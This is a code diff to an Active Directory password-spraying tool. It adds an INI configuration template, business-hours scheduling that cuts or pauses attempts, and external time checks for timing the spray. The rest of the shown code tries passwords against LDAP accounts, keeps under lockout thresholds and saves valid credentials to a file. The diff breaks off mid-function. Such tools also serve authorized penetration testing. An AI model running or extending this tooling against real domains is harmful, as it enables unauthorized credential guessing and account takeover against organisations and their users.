@@ -12,12 +12,16 @@ Features:
   - Skips passwords that don't meet password policy requirements
   - Session management with pause/resume support
   - Lockout detection with automatic pause
+  - Configuration file support (INI format)
+  - Business hours awareness with configurable attempt reduction
+  - External time verification for accurate scheduling
 
 Requires: pip install ldap3
 """
 
 import argparse
 import atexit
+import configparser
 import hashlib
 import json
 import os
@@ -25,10 +29,14 @@ import shutil
 import signal
 import sys
 import time
+import urllib.request
+import urllib.error
 from dataclasses import dataclass, field, asdict
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, time as dt_time
+from email.utils import parsedate_to_datetime
 from pathlib import Path
-from typing import List, Optional, Dict, Any, Set
+from typing import List, Optional, Dict, Any, Set, Tuple
+from zoneinfo import ZoneInfo
 
 from ad_ldap_utils import check_auth, AD_ERROR_CODES, ADConnection
 
@@ -90,6 +98,669 @@ SKIP_USER_STATUSES = {
 }
 
 DEFAULT_SESSION_PATH = Path.home() / ".adspray" / "sessions"
+
+# Days of week for schedule parsing
+DAYS_OF_WEEK = ['monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday', 'sunday']
+
+# External time sources for verification
+EXTERNAL_TIME_SOURCES = [
+    # Primary: Major tech companies with reliable servers
+    ("https://www.google.com", "Google"),
+    ("https://www.cloudflare.com", "Cloudflare"),
+    ("https://www.microsoft.com", "Microsoft"),
+    # Fallback: Time API
+    ("https://worldtimeapi.org/api/ip", "WorldTimeAPI"),
+]
+
+# Maximum allowed drift between system time and external time (seconds)
+MAX_TIME_DRIFT_SECONDS = 60
+
+# How often to re-verify external time during spray (seconds)
+TIME_REVERIFICATION_INTERVAL = 300  # 5 minutes
+
+
+# ---------------------------------------------------------------------------
+# Time Verification
+# ---------------------------------------------------------------------------
+
+class TimeVerificationError(Exception):
+    """Raised when external time cannot be verified."""
+    pass
+
+
+@dataclass
+class TimeVerificationResult:
+    """Result of time verification."""
+    verified_time: datetime
+    source: str
+    system_time: datetime
+    offset_seconds: float  # positive = system ahead, negative = system behind
+    
+    @property
+    def drift_acceptable(self) -> bool:
+        """Check if the drift is within acceptable limits."""
+        return abs(self.offset_seconds) <= MAX_TIME_DRIFT_SECONDS
+
+
+class TimeVerifier:
+    """
+    Verifies current time against external sources.
+    
+    This ensures the spray operates on accurate time, critical for
+    respecting business hours schedules.
+    """
+    
+    def __init__(self, force_system_time: bool = False, verbose: int = 3):
+        self.force_system_time = force_system_time
+        self.verbose = verbose
+        self._offset_seconds: Optional[float] = None
+        self._last_verification: Optional[datetime] = None
+        self._source: Optional[str] = None
+        self._verified = False
+    
+    def _print(self, message: str, level: int = 3):
+        """Print message if verbosity level is high enough."""
+        if self.verbose >= level:
+            print(message, file=sys.stderr)
+    
+    def _fetch_http_time(self, url: str, source_name: str) -> Optional[datetime]:
+        """
+        Fetch time from HTTP Date header.
+        
+        Returns UTC datetime or None if failed.
+        """
+        try:
+            req = urllib.request.Request(url, method='HEAD')
+            req.add_header('User-Agent', 'ADSpray-TimeCheck/1.0')
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                date_header = response.headers.get('Date')
+                if date_header:
+                    # Parse RFC 2822 date format
+                    return parsedate_to_datetime(date_header)
+        except Exception:
+            pass
+        return None
+    
+    def _fetch_api_time(self, url: str) -> Optional[datetime]:
+        """
+        Fetch time from WorldTimeAPI.
+        
+        Returns UTC datetime or None if failed.
+        """
+        try:
+            req = urllib.request.Request(url)
+            req.add_header('User-Agent', 'ADSpray-TimeCheck/1.0')
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                data = json.loads(response.read().decode('utf-8'))
+                # WorldTimeAPI returns ISO format datetime
+                utc_datetime = data.get('utc_datetime')
+                if utc_datetime:
+                    # Parse ISO format, handle 'Z' suffix
+                    utc_datetime = utc_datetime.replace('Z', '+00:00')
+                    return datetime.fromisoformat(utc_datetime)
+        except Exception:
+            pass
+        return None
+    
+    def verify(self) -> TimeVerificationResult:
+        """
+        Verify current time against external sources.
+        
+        Returns TimeVerificationResult with verified time.
+        Raises TimeVerificationError if verification fails and not forcing system time.
+        """
+        system_time = datetime.now(ZoneInfo('UTC'))
+        
+        if self.force_system_time:
+            self._verified = True
+            self._offset_seconds = 0.0
+            self._source = "System Clock (forced)"
+            self._last_verification = system_time
+            return TimeVerificationResult(
+                verified_time=system_time,
+                source=self._source,
+                system_time=system_time,
+                offset_seconds=0.0,
+            )
+        
+        # Try each external source
+        external_time: Optional[datetime] = None
+        source_name: Optional[str] = None
+        
+        for url, name in EXTERNAL_TIME_SOURCES:
+            self._print(f"{Colors.BLUE}[+] Checking time from {name}...{Colors.NC}", level=2)
+            
+            if 'worldtimeapi' in url:
+                external_time = self._fetch_api_time(url)
+            else:
+                external_time = self._fetch_http_time(url, name)
+            
+            if external_time:
+                source_name = name
+                self._print(f"{Colors.GREEN}[+] Got time from {name}{Colors.NC}", level=2)
+                break
+            else:
+                self._print(f"{Colors.ORANGE}[!] Failed to get time from {name}{Colors.NC}", level=2)
+        
+        if external_time is None:
+            raise TimeVerificationError(
+                "Could not verify time from any external source. "
+                "Use --force-system-time to proceed with system clock (not recommended)."
+            )
+        
+        # Ensure external_time is UTC
+        if external_time.tzinfo is None:
+            external_time = external_time.replace(tzinfo=ZoneInfo('UTC'))
+        else:
+            external_time = external_time.astimezone(ZoneInfo('UTC'))
+        
+        # Calculate offset
+        offset = (system_time - external_time).total_seconds()
+        
+        self._verified = True
+        self._offset_seconds = offset
+        self._source = source_name
+        self._last_verification = datetime.now()
+        
+        return TimeVerificationResult(
+            verified_time=external_time,
+            source=source_name,
+            system_time=system_time,
+            offset_seconds=offset,
+        )
+    
+    def get_current_time(self, timezone: Optional[str] = None) -> datetime:
+        """
+        Get the current verified time.
+        
+        If timezone is provided, returns time in that timezone.
+        Otherwise returns UTC.
+        
+        Re-verifies if the last verification was too long ago.
+        """
+        # Re-verify periodically
+        if (self._last_verification is None or 
+            (datetime.now() - self._last_verification).total_seconds() > TIME_REVERIFICATION_INTERVAL):
+            try:
+                self.verify()
+            except TimeVerificationError:
+                if not self.force_system_time:
+                    raise
+        
+        # Get system time and apply offset
+        if self.force_system_time or self._offset_seconds is None:
+            now_utc = datetime.now(ZoneInfo('UTC'))
+        else:
+            system_now = datetime.now(ZoneInfo('UTC'))
+            # Subtract offset to get true time (offset is system - external)
+            now_utc = system_now - timedelta(seconds=self._offset_seconds)
+        
+        if timezone:
+            try:
+                tz = ZoneInfo(timezone)
+                return now_utc.astimezone(tz)
+            except Exception:
+                return now_utc
+        
+        return now_utc
+    
+    def needs_reverification(self) -> bool:
+        """Check if time should be re-verified."""
+        if self._last_verification is None:
+            return True
+        elapsed = (datetime.now() - self._last_verification).total_seconds()
+        return elapsed > TIME_REVERIFICATION_INTERVAL
+    
+    @property
+    def source(self) -> str:
+        """Get the time source name."""
+        return self._source or "Unknown"
+    
+    @property
+    def is_verified(self) -> bool:
+        """Check if time has been verified."""
+        return self._verified
+
+
+def format_schedule_display(schedule: 'Schedule', time_verifier: TimeVerifier) -> str:
+    """
+    Format the weekly schedule for display.
+    
+    Shows each day with its hours and current status.
+    """
+    lines = []
+    
+    if not schedule.is_enabled():
+        return "  Schedule: Disabled (no timezone set)"
+    
+    try:
+        tz = ZoneInfo(schedule.timezone)
+        current_time = time_verifier.get_current_time(schedule.timezone)
+        current_day = DAYS_OF_WEEK[current_time.weekday()]
+    except Exception:
+        current_day = None
+        current_time = None
+    
+    lines.append(f"  Timezone: {schedule.timezone}")
+    lines.append(f"  Business hours reduction: {schedule.business_hours_reduction} attempts")
+    lines.append("")
+    lines.append("  Weekly Schedule:")
+    
+    for day in DAYS_OF_WEEK:
+        hours = schedule.daily_hours.get(day)
+        if hours is None:
+            hours_str = "off"
+        elif hours.pause_all_day:
+            hours_str = "PAUSE (no spraying)"
+        elif hours.start is None:
+            hours_str = "off (full speed)"
+        else:
+            hours_str = f"{hours.start.strftime('%H:%M')}-{hours.end.strftime('%H:%M')} (reduced attempts)"
+        
+        # Mark current day
+        marker = " <-- TODAY" if day == current_day else ""
+        is_current = "*" if day == current_day else " "
+        
+        lines.append(f"   {is_current} {day.capitalize():9}: {hours_str}{marker}")
+    
+    # Show current status
+    if current_time:
+        is_business, should_pause = schedule.get_current_status_with_time(current_time)
+        lines.append("")
+        if should_pause:
+            lines.append(f"  Current status: PAUSED (schedule dictates no spraying now)")
+        elif is_business:
+            lines.append(f"  Current status: BUSINESS HOURS (reduced attempts active)")
+        else:
+            lines.append(f"  Current status: Outside business hours (full speed)")
+    
+    return "\n".join(lines)
+
+
+# ---------------------------------------------------------------------------
+# Configuration File Handling
+# ---------------------------------------------------------------------------
+
+DEFAULT_CONFIG_TEMPLATE = """\
+# ADSpray Configuration File
+# --------------------------
+# Use 'auto' for users_file, lockout_threshold, lockout_window, min_length,
+# and complexity to automatically fetch values from Active Directory.
+# IMPORTANT: 'auto' settings REQUIRE valid AD credentials in [target].
+# If any setting is 'auto' and credentials are missing, the spray will fail.
+
+[target]
+# Domain controller FQDN or IP address
+dc = 10.0.0.1
+# NetBIOS domain/workgroup name
+workgroup = CORP
+# AD credentials for enumeration (REQUIRED for any 'auto' settings)
+username = admin
+password = P@ssw0rd!
+# Use LDAPS (SSL/TLS)
+ssl = false
+# Override port number (optional, leave empty for default)
+port = 
+# Override LDAP base DN (optional, leave empty for auto-detect)
+base_dn = 
+
+[spray]
+# File containing passwords to spray
+passwords_file = passwords.txt
+# File containing usernames, or 'auto' to enumerate from AD (requires credentials)
+users_file = auto
+# Output file for valid credentials
+output = valid_creds.txt
+# Try username as password
+userpass = false
+# Verbosity level (0=silent, 1=minimal, 2=normal, 3=verbose)
+verbose = 3
+
+[policy]
+# Lockout threshold, or 'auto' to fetch from AD (requires credentials)
+# 0 = no lockout policy
+lockout_threshold = auto
+# Lockout observation window in minutes, or 'auto' to fetch from AD (requires credentials)
+lockout_window = auto
+# Minimum password length, or 'auto' to fetch from AD (requires credentials)
+min_length = auto
+# Require password complexity, or 'auto' to fetch from AD (requires credentials)
+complexity = auto
+
+[schedule]
+# Timezone for business hours (IANA format, e.g., America/New_York, Europe/London)
+# Leave empty to disable business hours feature
+timezone = 
+# Number of attempts to reduce during business hours
+# Formula: attempts_allowed = lockout_threshold - business_hours_reduction
+# e.g., if threshold=5 and reduction=3, then 5-3=2 attempts allowed during business hours
+# If the result is 0 or negative, spray pauses entirely during business hours
+business_hours_reduction = 3
+# Force use of system clock instead of external time verification
+# WARNING: Only set to 'true' if you cannot access external time sources
+# If enabled, ensure your system clock is accurate to avoid spraying during business hours
+force_system_time = false
+# Business hours for each day (HH:MM-HH:MM format, 24-hour)
+# Use 'off' to indicate no restrictions (full speed spraying)
+# Use 'pause' to pause entirely on that day
+monday = 09:00-17:00
+tuesday = 09:00-17:00
+wednesday = 09:00-17:00
+thursday = 09:00-17:00
+friday = 09:00-17:00
+saturday = off
+sunday = off
+"""
+
+
+@dataclass
+class BusinessHoursWindow:
+    """Represents business hours for a single day."""
+    start: Optional[dt_time]  # None means 'off' (no restrictions)
+    end: Optional[dt_time]
+    pause_all_day: bool = False  # True means 'pause' (no spraying this day)
+
+    @classmethod
+    def parse(cls, value: str) -> "BusinessHoursWindow":
+        """Parse a business hours string like '09:00-17:00', 'off', or 'pause'."""
+        value = value.strip().lower()
+        
+        if value == 'off' or value == '':
+            return cls(start=None, end=None, pause_all_day=False)
+        
+        if value == 'pause':
+            return cls(start=None, end=None, pause_all_day=True)
+        
+        if '-' not in value:
+            raise ValueError(f"Invalid business hours format: {value}. Use HH:MM-HH:MM, 'off', or 'pause'")
+        
+        try:
+            start_str, end_str = value.split('-')
+            start_parts = start_str.strip().split(':')
+            end_parts = end_str.strip().split(':')
+            
+            start = dt_time(int(start_parts[0]), int(start_parts[1]))
+            end = dt_time(int(end_parts[0]), int(end_parts[1]))
+            
+            return cls(start=start, end=end, pause_all_day=False)
+        except (ValueError, IndexError) as e:
+            raise ValueError(f"Invalid business hours format: {value}. Use HH:MM-HH:MM format") from e
+
+    def is_within_hours(self, current_time: dt_time) -> bool:
+        """Check if the given time falls within business hours."""
+        if self.pause_all_day:
+            return True  # Treat pause days as "always in business hours" for reduction logic
+        
+        if self.start is None or self.end is None:
+            return False  # 'off' means no business hours restriction
+        
+        # Handle overnight spans (e.g., 22:00-06:00)
+        if self.start <= self.end:
+            return self.start <= current_time <= self.end
+        else:
+            return current_time >= self.start or current_time <= self.end
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "start": self.start.isoformat() if self.start else None,
+            "end": self.end.isoformat() if self.end else None,
+            "pause_all_day": self.pause_all_day,
+        }
+
+    @classmethod
+    def from_dict(cls, d: Dict[str, Any]) -> "BusinessHoursWindow":
+        return cls(
+            start=dt_time.fromisoformat(d["start"]) if d.get("start") else None,
+            end=dt_time.fromisoformat(d["end"]) if d.get("end") else None,
+            pause_all_day=d.get("pause_all_day", False),
+        )
+
+
+@dataclass
+class Schedule:
+    """Business hours schedule with timezone."""
+    timezone: Optional[str]  # IANA timezone name, None means disabled
+    business_hours_reduction: int
+    daily_hours: Dict[str, BusinessHoursWindow]  # day name -> hours
+
+    def is_enabled(self) -> bool:
+        """Check if schedule feature is enabled."""
+        return self.timezone is not None and self.timezone.strip() != ''
+
+    def get_current_status(self) -> Tuple[bool, bool]:
+        """
+        Get current schedule status using system time.
+        
+        Returns:
+            Tuple of (is_business_hours: bool, should_pause: bool)
+        """
+        if not self.is_enabled():
+            return False, False
+        
+        try:
+            tz = ZoneInfo(self.timezone)
+        except Exception:
+            return False, False
+        
+        now = datetime.now(tz)
+        return self.get_current_status_with_time(now)
+
+    def get_current_status_with_time(self, current_datetime: datetime) -> Tuple[bool, bool]:
+        """
+        Get schedule status for a specific time.
+        
+        Args:
+            current_datetime: The datetime to check (should be in the schedule's timezone)
+        
+        Returns:
+            Tuple of (is_business_hours: bool, should_pause: bool)
+        """
+        if not self.is_enabled():
+            return False, False
+        
+        day_name = DAYS_OF_WEEK[current_datetime.weekday()]
+        current_time = current_datetime.time()
+        
+        hours = self.daily_hours.get(day_name)
+        if hours is None:
+            return False, False
+        
+        if hours.pause_all_day:
+            return True, True
+        
+        is_business = hours.is_within_hours(current_time)
+        return is_business, False
+
+    def get_reduced_attempts(self, lockout_threshold: int) -> int:
+        """
+        Calculate reduced attempts during business hours.
+        
+        Args:
+            lockout_threshold: The lockout threshold from policy
+            
+        Returns:
+            Reduced attempt count (may be 0 or negative, meaning pause)
+            e.g., threshold=5, reduction=3 -> 2 attempts allowed
+        """
+        return lockout_threshold - self.business_hours_reduction
+
+    def get_time_until_business_hours_end(self) -> Optional[int]:
+        """
+        Get seconds until business hours end using system time.
+        
+        Returns:
+            Seconds until end, or None if not in business hours or schedule disabled
+        """
+        if not self.is_enabled():
+            return None
+        
+        try:
+            tz = ZoneInfo(self.timezone)
+        except Exception:
+            return None
+        
+        now = datetime.now(tz)
+        return self.get_time_until_business_hours_end_with_time(now)
+
+    def get_time_until_business_hours_end_with_time(self, current_datetime: datetime) -> Optional[int]:
+        """
+        Get seconds until business hours end for a specific time.
+        
+        Args:
+            current_datetime: The datetime to check (should be in the schedule's timezone)
+        
+        Returns:
+            Seconds until end, or None if not in business hours or schedule disabled
+        """
+        if not self.is_enabled():
+            return None
+        
+        day_name = DAYS_OF_WEEK[current_datetime.weekday()]
+        current_time = current_datetime.time()
+        
+        hours = self.daily_hours.get(day_name)
+        if hours is None or hours.start is None:
+            return None
+        
+        if hours.pause_all_day:
+            # Calculate time until midnight
+            tomorrow = current_datetime.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
+            return int((tomorrow - current_datetime).total_seconds())
+        
+        if not hours.is_within_hours(current_time):
+            return None
+        
+        # Calculate time until end
+        end_dt = current_datetime.replace(hour=hours.end.hour, minute=hours.end.minute, second=0, microsecond=0)
+        if end_dt <= current_datetime:
+            end_dt += timedelta(days=1)
+        
+        return int((end_dt - current_datetime).total_seconds())
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "timezone": self.timezone,
+            "business_hours_reduction": self.business_hours_reduction,
+            "daily_hours": {k: v.to_dict() for k, v in self.daily_hours.items()},
+        }
+
+    @classmethod
+    def from_dict(cls, d: Dict[str, Any]) -> "Schedule":
+        return cls(
+            timezone=d.get("timezone"),
+            business_hours_reduction=d.get("business_hours_reduction", 3),
+            daily_hours={k: BusinessHoursWindow.from_dict(v) for k, v in d.get("daily_hours", {}).items()},
+        )
+
+    @classmethod
+    def disabled(cls) -> "Schedule":
+        """Create a disabled schedule."""
+        return cls(
+            timezone=None,
+            business_hours_reduction=0,
+            daily_hours={},
+        )
+
+
+def load_config(config_path: str) -> Dict[str, Any]:
+    """
+    Load configuration from INI file.
+    
+    Returns a dict with all config values, using None for unset values.
+    """
+    config = configparser.ConfigParser()
+    config.read(config_path)
+    
+    result: Dict[str, Any] = {}
+    
+    # [target] section
+    if config.has_section('target'):
+        result['dc'] = config.get('target', 'dc', fallback=None)
+        result['workgroup'] = config.get('target', 'workgroup', fallback=None)
+        result['username'] = config.get('target', 'username', fallback=None)
+        result['password'] = config.get('target', 'password', fallback=None)
+        result['ssl'] = config.getboolean('target', 'ssl', fallback=False)
+        port_str = config.get('target', 'port', fallback='')
+        result['port'] = int(port_str) if port_str.strip() else None
+        base_dn = config.get('target', 'base_dn', fallback='')
+        result['base_dn'] = base_dn if base_dn.strip() else None
+    
+    # [spray] section
+    if config.has_section('spray'):
+        result['passwords_file'] = config.get('spray', 'passwords_file', fallback=None)
+        result['users_file'] = config.get('spray', 'users_file', fallback=None)
+        result['output'] = config.get('spray', 'output', fallback='valid_creds.txt')
+        result['userpass'] = config.getboolean('spray', 'userpass', fallback=False)
+        result['verbose'] = config.getint('spray', 'verbose', fallback=3)
+    
+    # [policy] section - support 'auto' keyword
+    if config.has_section('policy'):
+        for key in ['lockout_threshold', 'lockout_window', 'min_length']:
+            val = config.get('policy', key, fallback='auto')
+            result[key] = 'auto' if val.lower() == 'auto' else int(val)
+        
+        complexity_val = config.get('policy', 'complexity', fallback='auto')
+        if complexity_val.lower() == 'auto':
+            result['complexity'] = 'auto'
+        else:
+            result['complexity'] = config.getboolean('policy', 'complexity', fallback=False)
+    
+    # [schedule] section
+    if config.has_section('schedule'):
+        timezone = config.get('schedule', 'timezone', fallback='')
+        result['timezone'] = timezone if timezone.strip() else None
+        result['business_hours_reduction'] = config.getint('schedule', 'business_hours_reduction', fallback=3)
+        result['force_system_time'] = config.getboolean('schedule', 'force_system_time', fallback=False)
+        
+        result['daily_hours'] = {}
+        for day in DAYS_OF_WEEK:
+            hours_str = config.get('schedule', day, fallback='off')
+            result['daily_hours'][day] = BusinessHoursWindow.parse(hours_str)
+    
+    return result
+
+
+def merge_config_with_args(config: Dict[str, Any], args: argparse.Namespace) -> argparse.Namespace:
+    """
+    Merge config file values with CLI args. CLI args take precedence.
+    """
+    # Map of config keys to arg names (where they differ)
+    key_mapping = {
+        'passwords_file': 'spray_passwords',
+        'lockout_threshold': 'lockout_threshold',
+        'lockout_window': 'lockout_window',
+        'min_length': 'min_length',
+    }
+    
+    for config_key, config_value in config.items():
+        if config_value is None:
+            continue
+        
+        arg_key = key_mapping.get(config_key, config_key)
+        
+        # Skip if CLI arg was explicitly provided (not default)
+        # We check against None for optional args and check hasattr for safety
+        if hasattr(args, arg_key):
+            current_value = getattr(args, arg_key)
+            # If CLI provided a value (not None and not the argparse default), keep it
+            if current_value is not None:
+                continue
+        
+        setattr(args, arg_key, config_value)
+    
+    return args
+
+
+def generate_config_file(output_path: Optional[str] = None) -> str:
+    """Generate a template configuration file."""
+    if output_path:
+        with open(output_path, 'w') as f:
+            f.write(DEFAULT_CONFIG_TEMPLATE)
+        return f"Configuration template written to: {output_path}"
+    else:
+        return DEFAULT_CONFIG_TEMPLATE
 
 
 # ---------------------------------------------------------------------------
@@ -164,6 +835,7 @@ class SpraySession:
     """A complete spray session with config, attempts, and policy."""
     config: SprayConfig
     policy: PasswordPolicy
+    schedule: Schedule = field(default_factory=Schedule.disabled)
     users: List[str] = field(default_factory=list)
     passwords: List[str] = field(default_factory=list)
     attempts: List[Attempt] = field(default_factory=list)
@@ -176,6 +848,7 @@ class SpraySession:
         return {
             "config": self.config.to_dict(),
             "policy": self.policy.to_dict(),
+            "schedule": self.schedule.to_dict(),
             "users": self.users,
             "passwords": self.passwords,
             "attempts": [a.to_dict() for a in self.attempts],
@@ -190,6 +863,7 @@ class SpraySession:
         return cls(
             config=SprayConfig.from_dict(d["config"]),
             policy=PasswordPolicy.from_dict(d["policy"]),
+            schedule=Schedule.from_dict(d["schedule"]) if "schedule" in d else Schedule.disabled(),
             users=d.get("users", []),
             passwords=d.get("passwords", []),
             attempts=[Attempt.from_dict(a) for a in d.get("attempts", [])],
@@ -225,22 +899,50 @@ class SpraySession:
                 stats[attempt.status] = stats.get(attempt.status, 0) + 1
         return stats
 
-    def get_safe_attempts_per_window(self) -> int:
+    def get_safe_attempts_per_window(
+        self, 
+        apply_schedule: bool = True, 
+        time_verifier: Optional['TimeVerifier'] = None
+    ) -> int:
         """
         Calculate the maximum attempts per user within the observation window
         that won't trigger lockout.
 
-        Returns n-1 where n is the lockout threshold.
-        e.g., threshold=5 -> 4 attempts allowed
-              threshold=1 -> 0 attempts (cannot spray safely!)
-              threshold=0 -> unlimited (no lockout policy)
+        Args:
+            apply_schedule: If True, apply business hours reduction if applicable
+            time_verifier: Optional TimeVerifier to use for accurate time
+
+        Returns:
+            n-1 where n is the lockout threshold (possibly reduced for business hours).
+            Returns 0 or negative if should pause entirely.
+            e.g., threshold=5 -> 4 attempts allowed
+                  threshold=1 -> 0 attempts (cannot spray safely!)
+                  threshold=0 -> unlimited (no lockout policy)
         """
         if self.policy.lockout_threshold == 0:
             # No lockout policy
             return 100
 
-        # Exactly n-1 to guarantee no lockout
-        return self.policy.lockout_threshold - 1
+        # Base: exactly n-1 to guarantee no lockout
+        base_attempts = self.policy.lockout_threshold - 1
+
+        # Apply schedule reduction if enabled and in business hours
+        if apply_schedule and self.schedule.is_enabled():
+            # Get current time from verifier if available, otherwise use system time
+            if time_verifier:
+                current_time = time_verifier.get_current_time(self.schedule.timezone)
+                is_business, should_pause = self.schedule.get_current_status_with_time(current_time)
+            else:
+                is_business, should_pause = self.schedule.get_current_status()
+            
+            if should_pause:
+                return 0  # Pause day
+            if is_business:
+                # During business hours: threshold - reduction
+                # e.g., threshold=5, reduction=3 -> 2 attempts
+                return self.schedule.get_reduced_attempts(self.policy.lockout_threshold)
+
+        return base_attempts
 
     def get_sleep_time_seconds(self) -> int:
         """
@@ -317,10 +1019,17 @@ class SpraySession:
 class SprayEngine:
     """Engine for executing password spray attacks."""
 
-    def __init__(self, session: SpraySession, session_path: Path, verbose: int = 3):
+    def __init__(
+        self, 
+        session: SpraySession, 
+        session_path: Path, 
+        verbose: int = 3,
+        time_verifier: Optional[TimeVerifier] = None
+    ):
         self.session = session
         self.session_path = session_path
         self.verbose = verbose
+        self.time_verifier = time_verifier or TimeVerifier(force_system_time=True, verbose=verbose)
         self.paused = False
         self.stopped = False
         self.consecutive_lockouts = 0
@@ -393,13 +1102,23 @@ class SprayEngine:
             # Calculate ETA
             eta_str = self._calculate_eta_string()
 
+            # Add schedule status if enabled
+            schedule_str = ""
+            if self.session.schedule.is_enabled():
+                current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
+                is_business, should_pause = self.session.schedule.get_current_status_with_time(current_time)
+                if should_pause:
+                    schedule_str = f" | {Colors.RED}PAUSED (schedule){Colors.NC}"
+                elif is_business:
+                    schedule_str = f" | {Colors.ORANGE}Business hours{Colors.NC}"
+
             # Build status line
             if extra:
-                status = f" {Colors.LBLUE}[{extra}]{Colors.NC} | {eta_str}"
+                status = f" {Colors.LBLUE}[{extra}]{Colors.NC} | {eta_str}{schedule_str}"
             elif password:
-                status = f" {Colors.LBLUE}Password:{Colors.NC} {password} | {eta_str}"
+                status = f" {Colors.LBLUE}Password:{Colors.NC} {password} | {eta_str}{schedule_str}"
             else:
-                status = f" {eta_str}"
+                status = f" {eta_str}{schedule_str}"
 
             # Save cursor, move to bottom line, clear it, print status, restore cursor
             # Using portable escape sequences
@@ -421,7 +1140,7 @@ class SprayEngine:
         if passwords_remaining <= 0:
             return "ETA: completing..."
 
-        safe_attempts = self.session.get_safe_attempts_per_window()
+        safe_attempts = self.session.get_safe_attempts_per_window(apply_schedule=False)  # Base attempts for ETA
         sleep_time = self.session.get_sleep_time_seconds()
 
         # Calculate remaining sleep cycles
@@ -533,12 +1252,83 @@ class SprayEngine:
         )
         return result["status"]
 
+    def _wait_for_business_hours_end(self):
+        """Wait until business hours end if currently in business hours with reduced attempts <= 0."""
+        if not self.session.schedule.is_enabled():
+            return
+
+        while not self.stopped:
+            # Use verified time for schedule checks
+            safe_attempts = self.session.get_safe_attempts_per_window(
+                apply_schedule=True, 
+                time_verifier=self.time_verifier
+            )
+            
+            if safe_attempts > 0:
+                # Can proceed with reduced attempts
+                return
+            
+            current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
+            is_business, should_pause = self.session.schedule.get_current_status_with_time(current_time)
+            
+            if not is_business and not should_pause:
+                # Outside business hours, can proceed
+                return
+            
+            # Need to wait
+            wait_time = self.session.schedule.get_time_until_business_hours_end_with_time(current_time)
+            if wait_time is None or wait_time <= 0:
+                return
+            
+            # Cap wait time and show status
+            wait_chunk = min(wait_time, 60)  # Check every minute
+            hours = wait_time // 3600
+            mins = (wait_time % 3600) // 60
+            
+            self._print(
+                f"{Colors.ORANGE}[+] Pausing during business hours. "
+                f"Resuming in ~{hours}h {mins}m...{Colors.NC}",
+                level=1
+            )
+            self._update_status_bar(extra=f"Paused (business hours) - {hours}h {mins}m remaining")
+            
+            # Sleep in chunks to respond to interrupts
+            remaining = wait_chunk
+            while remaining > 0 and not self.stopped:
+                self._check_pause()
+                if self.stopped:
+                    return
+                chunk = min(remaining, 1)
+                time.sleep(chunk)
+                remaining -= chunk
+
     def run(self) -> bool:
         """Execute the spray. Returns True if completed successfully."""
         config = self.session.config
         policy = self.session.policy
 
-        safe_attempts = self.session.get_safe_attempts_per_window()
+        # Display time verification status
+        self._print(f"{Colors.ORANGE}[+] Time Verification{Colors.NC}", level=1)
+        self._print(f"{Colors.BLUE}[+]     Time Source:{Colors.NC} {self.time_verifier.source}", level=1)
+        
+        if self.session.schedule.is_enabled():
+            current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
+            self._print(f"{Colors.BLUE}[+]   Current Time:{Colors.NC} {current_time.strftime('%Y-%m-%d %H:%M:%S %Z')}", level=1)
+        else:
+            current_time = self.time_verifier.get_current_time()
+            self._print(f"{Colors.BLUE}[+]   Current Time:{Colors.NC} {current_time.strftime('%Y-%m-%d %H:%M:%S')} UTC", level=1)
+        
+        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
+
+        # Display schedule information if enabled
+        if self.session.schedule.is_enabled():
+            self._print(f"{Colors.ORANGE}[+] Business Hours Schedule{Colors.NC}", level=1)
+            schedule_display = format_schedule_display(self.session.schedule, self.time_verifier)
+            for line in schedule_display.split('\n'):
+                self._print(f"{Colors.BLUE}[+]{Colors.NC}{line}", level=1)
+            self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
+
+        safe_attempts = self.session.get_safe_attempts_per_window(apply_schedule=False)  # Base for display
         sleep_time = self.session.get_sleep_time_seconds()
 
         # Check if spraying is even possible with this lockout policy
@@ -590,6 +1380,9 @@ class SprayEngine:
         self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
         self._print(f"{Colors.BLUE}[+]   Spray Strategy{Colors.NC}", level=1)
         self._print(f"{Colors.BLUE}[+]  Safe attempts:{Colors.NC} {safe_attempts} per window", level=1)
+        if self.session.schedule.is_enabled():
+            reduced = self.session.schedule.get_reduced_attempts(policy.lockout_threshold)
+            self._print(f"{Colors.BLUE}[+]  Business hrs:{Colors.NC} {reduced} per window (reduction: {self.session.schedule.business_hours_reduction})", level=1)
         if sleep_time > 0:
             self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} {sleep_time // 60} min", level=1)
         else:
@@ -625,6 +1418,12 @@ class SprayEngine:
         try:
             # Handle user-as-password first if enabled
             if config.user_as_pass and self.session.current_password_index == 0:
+                # Check business hours before starting
+                self._wait_for_business_hours_end()
+                if self.stopped:
+                    self._save_session()
+                    return False
+
                 self._current_password_num = 1
                 self._update_status_bar(password="<username>")
                 self._print(f"{Colors.ORANGE}[+] Trying username as password...{Colors.NC}", level=2)
@@ -660,6 +1459,12 @@ class SprayEngine:
                     self._save_session()
                     return False
 
+                # Check business hours before each password
+                self._wait_for_business_hours_end()
+                if self.stopped:
+                    self._save_session()
+                    return False
+
                 # Update progress tracking
                 self._current_password_num = pwd_idx + 1 + (1 if config.user_as_pass else 0)
                 self._update_status_bar(password=password)
@@ -687,7 +1492,7 @@ class SprayEngine:
                 self.session.current_password_index = pwd_idx + 1
                 self.session.attempts_since_sleep += 1
 
-                # Check if we need to sleep
+                # Check if we need to sleep (using current schedule-adjusted attempts)
                 if self._should_sleep() and pwd_idx < len(valid_passwords) - 1:
                     self._update_status_bar(extra=f"Sleeping {sleep_time // 60}m")
                     self._do_sleep(sleep_time)
@@ -712,8 +1517,14 @@ class SprayEngine:
 
     def _should_sleep(self) -> bool:
         """Check if we should sleep before the next password."""
-        safe_attempts = self.session.get_safe_attempts_per_window()
+        # Get current safe attempts (schedule-aware with verified time)
+        safe_attempts = self.session.get_safe_attempts_per_window(
+            apply_schedule=True,
+            time_verifier=self.time_verifier
+        )
         if safe_attempts >= 100:  # No lockout policy
+            return False
